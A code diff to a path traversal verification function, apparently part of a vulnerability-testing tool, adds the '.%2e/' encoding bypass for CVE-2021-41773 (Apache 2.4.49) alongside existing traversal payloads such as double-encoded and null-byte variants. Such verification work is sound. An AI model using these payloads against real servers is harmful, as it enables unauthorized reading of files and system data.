@@ -706,6 +706,11 @@ def verify_generic_path_traversal(
         attempts += [("%252e%252e%252f" * n) + rel for n in depths]
         attempts += [("..\\" * n) + rel for n in depths]
         attempts += [("....//" * n) + rel for n in depths]
+        # Codificacion '.%2e/' (punto + slash codificado): bypass especifico de CVE-2021-41773
+        # (Apache httpd 2.4.49) donde el normalizador de rutas no desnormalizaba esta secuencia.
+        # Ninguna de las variantes estandar de arriba la cubre (confirmado en vivo: ..%2f y
+        # %2e%2e%2f no funcionan contra Apache 2.4.49; solo .%2e/ funciona).
+        attempts += [(".%2e/" * n) + rel for n in depths]
         attempts += [rel + "%00", canary_path + "%00"]
 
         res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
